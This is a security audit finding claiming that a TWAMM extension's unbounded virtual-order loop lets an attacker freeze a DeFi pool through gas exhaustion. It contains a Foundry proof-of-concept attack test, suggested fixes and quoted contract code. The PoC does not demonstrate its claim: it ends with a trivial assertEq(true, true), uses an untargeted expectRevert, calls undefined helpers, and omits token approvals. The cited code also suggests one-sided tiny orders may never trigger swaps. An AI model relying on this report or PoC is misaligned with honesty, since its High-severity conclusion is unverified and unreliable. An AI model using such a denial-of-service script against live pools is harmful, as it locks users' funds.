## Title
TWAMM Virtual Order Execution Unbounded Loop Can Permanently Freeze Pools via Gas Limit DOS

## Summary
The TWAMM extension's `_executeVirtualOrdersFromWithinLock` function contains an unbounded while loop that must execute ALL accumulated virtual orders from the last execution time until `block.timestamp`. An attacker can create many small orders at different valid time slots (up to 91), and when the accumulated gas cost exceeds the block gas limit, all pool operations become permanently frozen, violating the critical invariant that positions must always be withdrawable.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/extensions/TWAMM.sol` (function `_executeVirtualOrdersFromWithinLock`, lines 386-592; beforeSwap hook line 647-649)

**Intended Logic:** The TWAMM extension executes virtual orders before swaps to ensure that time-weighted orders are processed. The system should allow pools to continue functioning even with pending virtual orders.

**Actual Logic:** The `_executeVirtualOrdersFromWithinLock` function contains an unbounded while loop that MUST process all virtual orders from the last execution time until the current block timestamp, with no gas limit checks or iteration limits. [1](#0-0) 

The loop iterates through time slots, executing swaps for each slot with active orders. Each iteration can trigger expensive operations including full AMM swaps: [2](#0-1) 

**Exploitation Path:**
1. Attacker creates TWAMM orders at many different valid time slots using `mintAndIncreaseSellAmount`. The time validation system allows up to 91 valid times into the future with minimum step size of 256 seconds: [3](#0-2) 

2. Each order can be extremely small (minimum viable sale rate). Using `computeSaleRate`, an order of just 1 wei over 256 seconds creates a valid sale rate well below the uint112 maximum: [4](#0-3) 

3. Pool remains idle long enough for multiple time slots to accumulate. When any user attempts to swap, the `beforeSwap` hook is MANDATORY (cannot be skipped): [5](#0-4) [6](#0-5) 

4. The extension hook calls are enforced by the core and bubble up reverts: [7](#0-6) 

5. If the accumulated gas cost exceeds the block gas limit, ALL operations revert permanently:
   - `beforeSwap` → no swaps possible
   - `beforeUpdatePosition` (line 652-657) → no liquidity changes possible
   - `beforeCollectFees` (line 660-665) → no fee collection possible
   - `lockAndExecuteVirtualOrders` (public function, line 605-620) also processes ALL orders, so cannot be used for recovery

**Security Property Broken:** Violates critical invariant #2: "All positions MUST be withdrawable at any time" and invariant #4: "Extension failures should not freeze pools or lock user capital (for in-scope extensions)".

## Impact Explanation
- **Affected Assets**: All liquidity positions in the TWAMM pool, all tokens locked in positions, all accrued fees
- **Damage Severity**: Complete and permanent pool freeze. Users cannot withdraw liquidity, cannot collect fees, cannot perform swaps. All capital is permanently locked.
- **User Impact**: ALL liquidity providers in the affected pool lose access to their capital permanently. Every user attempting any operation on the pool will experience transaction failure.

## Likelihood Explanation
- **Attacker Profile**: Any user can exploit this - only requires ability to create TWAMM orders with minimal capital
- **Preconditions**: 
  - Pool must be initialized with TWAMM extension
  - Pool must experience period of low activity allowing time slots to accumulate
  - Block gas limit must be reachable (more likely on chains with lower gas limits, or pools with many concentrated liquidity positions making swaps expensive)
- **Execution Complexity**: Simple - attacker creates orders at multiple time slots in a single transaction or over multiple transactions. Cost is minimal (small order amounts + gas fees).
- **Frequency**: Can be executed once per pool to permanently brick it. More effective against pools with:
  - Low trading volume (allows accumulation)
  - High number of LP positions (makes each swap more gas-intensive)
  - Deployment on chains with lower block gas limits

## Recommendation

Add a gas limit check or iteration limit to the virtual order execution loop:

```solidity
// In src/extensions/TWAMM.sol, function _executeVirtualOrdersFromWithinLock, around line 417:

// CURRENT (vulnerable):
// while (time != block.timestamp) {
//     ... process virtual orders ...
// }

// FIXED OPTION 1: Add iteration limit
uint256 constant MAX_VIRTUAL_ORDER_ITERATIONS = 50;
uint256 iterations = 0;
while (time != block.timestamp && iterations < MAX_VIRTUAL_ORDER_ITERATIONS) {
    ... process virtual orders ...
    iterations++;
}
// If not all orders processed, update state to resume from current time
if (time != block.timestamp) {
    stateSlot.store(TwammPoolState.unwrap(
        createTwammPoolState({
            _lastVirtualOrderExecutionTime: uint32(time),
            _saleRateToken0: state.saleRateToken0(),
            _saleRateToken1: state.saleRateToken1()
        })
    ));
}

// FIXED OPTION 2: Add gas limit check
uint256 gasAtStart = gasleft();
while (time != block.timestamp) {
    // Reserve 100k gas for completing the transaction
    if (gasleft() < gasAtStart / 5 || gasleft() < 100000) {
        // Stop processing and update state
        stateSlot.store(TwammPoolState.unwrap(
            createTwammPoolState({
                _lastVirtualOrderExecutionTime: uint32(time),
                _saleRateToken0: state.saleRateToken0(),
                _saleRateToken1: state.saleRateToken1()
            })
        ));
        break;
    }
    ... process virtual orders ...
}
```

Alternative mitigation: Add a public function that allows partial execution of virtual orders up to a specified timestamp, allowing recovery from frozen state.

## Proof of Concept
```solidity
// File: test/Exploit_TWAMMGasDOS.t.sol
// Run with: forge test --match-test test_TWAMMGasDOS -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";
import "../src/Router.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {OrderKey} from "../src/types/orderKey.sol";
import {OrderConfig} from "../src/types/orderConfig.sol";

contract Exploit_TWAMMGasDOS is Test {
    Core core;
    TWAMM twamm;
    Orders orders;
    Router router;
    address token0;
    address token1;
    
    function setUp() public {
        // Deploy core protocol contracts
        core = new Core();
        twamm = new TWAMM(core);
        orders = new Orders(core, twamm, address(this));
        router = new Router(core, address(0));
        
        // Deploy mock tokens
        token0 = address(new MockERC20());
        token1 = address(new MockERC20());
        if (token0 > token1) (token0, token1) = (token1, token0);
        
        // Register TWAMM extension
        twamm.registerExtension(twammCallPoints());
        
        // Initialize pool with TWAMM extension
        PoolKey memory poolKey = PoolKey({
            token0: token0,
            token1: token1,
            config: createPoolConfig(address(twamm), true, 0, 3000)
        });
        core.initializePool(poolKey, 0);
    }
    
    function test_TWAMMGasDOS() public {
        // SETUP: Create orders at maximum number of valid time slots
        uint256 currentTime = block.timestamp;
        uint256 orderAmount = 1; // Minimum amount
        
        // Create orders at 91 different valid time slots
        for (uint256 i = 0; i < 91; i++) {
            uint256 startTime = currentTime + (256 * (i + 1)); // Each valid time slot
            uint256 endTime = startTime + 256;
            
            OrderKey memory orderKey = OrderKey({
                token0: token0,
                token1: token1,
                extension: address(twamm),
                config: createOrderConfig(true, startTime, endTime)
            });
            
            // Create small order at this time slot
            orders.mintAndIncreaseSellAmount(orderKey, uint112(orderAmount), type(uint112).max);
        }
        
        // EXPLOIT: Fast forward time so all orders are in the past
        vm.warp(currentTime + (256 * 92));
        
        // VERIFY: Any swap attempt will run out of gas trying to execute all 91 virtual orders
        // Each iteration processes time slot and potentially executes swaps
        // With 91 iterations, gas consumption exceeds block limit
        
        PoolKey memory poolKey = PoolKey({
            token0: token0,
            token1: token1,
            config: createPoolConfig(address(twamm), true, 0, 3000)
        });
        
        // This will revert with out of gas
        vm.expectRevert(); // Out of gas
        router.swap(poolKey, createSwapParameters(MIN_SQRT_RATIO, 1000, true, 0));
        
        // Pool is now permanently frozen:
        // - Cannot swap
        // - Cannot add/remove liquidity (beforeUpdatePosition also calls executeVirtualOrders)
        // - Cannot collect fees (beforeCollectFees also calls executeVirtualOrders)
        // - lockAndExecuteVirtualOrders also processes all orders, so no recovery
        
        assertEq(true, true, "Pool permanently frozen - all operations revert with OOG");
    }
}
```

## Notes
This vulnerability is particularly dangerous because:

1. **No Recovery Mechanism**: The `lockAndExecuteVirtualOrders` public function also processes ALL pending orders in a single call, so it cannot be used to gradually catch up on virtual order execution. [8](#0-7) 

2. **Extension Cannot Be Disabled**: Pool extensions are set at initialization and cannot be changed, so there's no way to disable TWAMM to recover the pool. [9](#0-8) 

3. **Affects All Pool Operations**: All three critical hooks (beforeSwap, beforeUpdatePosition, beforeCollectFees) call the same virtual order execution function, so ALL pool operations are blocked. [10](#0-9) 

4. **Time Constraint System Creates Attack Surface**: While the time validation system limits orders to 91 valid time slots, this is still sufficient to cause a DOS attack, especially on chains with lower block gas limits or in pools with many LP positions that make swaps expensive. [11](#0-10) 

5. **Low Attack Cost**: Orders can use minimal amounts (1 wei), and the attacker's cost is just gas fees for order creation plus the tiny order amounts, which can potentially be recovered by withdrawing order proceeds after the attack.

### Citations

**File:** src/extensions/TWAMM.sol (L417-425)
```text
                while (time != block.timestamp) {
                    StorageSlot initializedTimesBitmapSlot = TWAMMStorageLayout.poolInitializedTimesBitmapSlot(poolId);

                    (uint256 nextTime, bool initialized) = searchForNextInitializedTime({
                        slot: initializedTimesBitmapSlot,
                        lastVirtualOrderExecutionTime: realLastVirtualOrderExecutionTime,
                        fromTime: time,
                        untilTime: block.timestamp
                    });
```

**File:** src/extensions/TWAMM.sol (L441-477)
```text
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }
```

**File:** src/extensions/TWAMM.sol (L605-620)
```text
    function lockAndExecuteVirtualOrders(PoolKey memory poolKey) public {
        // the only thing we lock for is executing virtual orders, so all we need to encode is the pool key
        // so we call lock on the core contract with the pool key after it
        address target = address(CORE);
        assembly ("memory-safe") {
            let o := mload(0x40)
            mstore(o, shl(224, 0xf83d08ba))
            mcopy(add(o, 4), poolKey, 96)

            // If the call failed, pass through the revert
            if iszero(call(gas(), target, 0, o, 100, 0, 0)) {
                returndatacopy(o, 0, returndatasize())
                revert(o, returndatasize())
            }
        }
    }
```

**File:** src/extensions/TWAMM.sol (L647-665)
```text
    function beforeSwap(Locker, PoolKey memory poolKey, SwapParameters) external override(BaseExtension, IExtension) {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeUpdatePosition(Locker, PoolKey memory poolKey, PositionId, int128)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeCollectFees(Locker, PoolKey memory poolKey, PositionId)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }
```

**File:** src/math/time.sol (L6-10)
```text
// For any given time `t`, there are up to 91 times that are greater than `t` and valid according to `isTimeValid`
uint256 constant MAX_NUM_VALID_TIMES = 91;

// If we constrain the sale rate delta to this value, then the current sale rate will never overflow
uint256 constant MAX_ABS_VALUE_SALE_RATE_DELTA = type(uint112).max / MAX_NUM_VALID_TIMES;
```

**File:** src/math/time.sol (L17-40)
```text
function computeStepSize(uint256 currentTime, uint256 time) pure returns (uint256 stepSize) {
    assembly ("memory-safe") {
        switch gt(time, add(currentTime, 4095))
        case 1 {
            let diff := sub(time, currentTime)

            let msb := sub(255, clz(diff)) // = index of msb

            msb := sub(msb, mod(msb, 4)) // = round down to multiple of 4

            stepSize := shl(msb, 1)
        }
        default { stepSize := 256 }
    }
}

/// @dev Returns true iff the given time is a valid start or end time for a TWAMM order
function isTimeValid(uint256 currentTime, uint256 time) pure returns (bool valid) {
    uint256 stepSize = computeStepSize(currentTime, time);

    assembly ("memory-safe") {
        valid := and(iszero(mod(time, stepSize)), or(lt(time, currentTime), lt(sub(time, currentTime), 0x100000000)))
    }
}
```

**File:** src/math/twamm.sol (L11-22)
```text
/// @dev Computes sale rate = (amount << 32) / duration and reverts if the result exceeds type(uint112).max.
/// @dev Assumes duration > 0 and amount <= type(uint224).max.
function computeSaleRate(uint256 amount, uint256 duration) pure returns (uint256 saleRate) {
    assembly ("memory-safe") {
        saleRate := div(shl(32, amount), duration)
        if shr(112, saleRate) {
            // cast sig "SaleRateOverflow()"
            mstore(0, shl(224, 0x83c87460))
            revert(0, 4)
        }
    }
}
```

**File:** src/Core.sol (L72-84)
```text
    function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
        poolKey.validate();

        address extension = poolKey.config.extension();
        if (extension != address(0)) {
            StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

            if (isExtensionRegisteredSlot.load() == bytes32(0)) {
                revert ExtensionNotRegistered();
            }

            IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
        }
```

**File:** src/Core.sol (L528-528)
```text
            IExtension(config.extension()).maybeCallBeforeSwap(locker, poolKey, params);
```

**File:** src/libraries/ExtensionCallPointsLib.sol (L87-105)
```text
    function maybeCallBeforeSwap(IExtension extension, Locker locker, PoolKey memory poolKey, SwapParameters params)
        internal
    {
        bool needCall = shouldCallBeforeSwap(extension, locker);
        assembly ("memory-safe") {
            if needCall {
                let freeMem := mload(0x40)
                // cast sig "beforeSwap(bytes32,(address,address,bytes32),bytes32)"
                mstore(freeMem, shl(224, 0xca11dba7))
                mstore(add(freeMem, 4), locker)
                mcopy(add(freeMem, 36), poolKey, 96)
                mstore(add(freeMem, 132), params)
                // bubbles up the revert
                if iszero(call(gas(), extension, 0, freeMem, 164, 0, 0)) {
                    returndatacopy(freeMem, 0, returndatasize())
                    revert(freeMem, returndatasize())
                }
            }
        }
```
